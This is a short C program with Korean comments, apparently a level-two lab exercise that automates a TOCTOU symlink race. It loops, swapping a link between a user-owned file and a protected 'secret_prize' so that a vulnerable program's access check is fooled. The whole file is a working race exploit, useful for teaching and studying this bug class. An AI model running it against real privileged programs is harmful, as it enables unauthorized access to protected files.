/* attack_loop.c — L2 연습: 루프로 심볼릭 링크 레이스를 '자동화' 한다.
 *
 * L1 에서는 10초 동안 손으로 한 번 바꿨다. 실제 공격은 윈도우가 짧으므로,
 * 링크를 쉼 없이 번갈아 걸어 승리 확률을 높인다.
 *
 * 빌드:  gcc -o attack_loop attack_loop.c
 * 사용:  ./attack_loop &        (백그라운드)
 *        그 상태에서 취약 프로그램을 반복 실행하는 루프를 함께 돌린다.
 */
#include <unistd.h>

int main(void) {
    while (1) {
        unlink("./target");
        symlink("./target_file", "./target");    /* access 통과용 (내 소유 파일) */
        usleep(1000);
        unlink("./target");
        symlink("./secret_prize", "./target");   /* 사용 시점에 쓰이길 바라는 대상 */
        usleep(1000);
    }
    return 0;
}
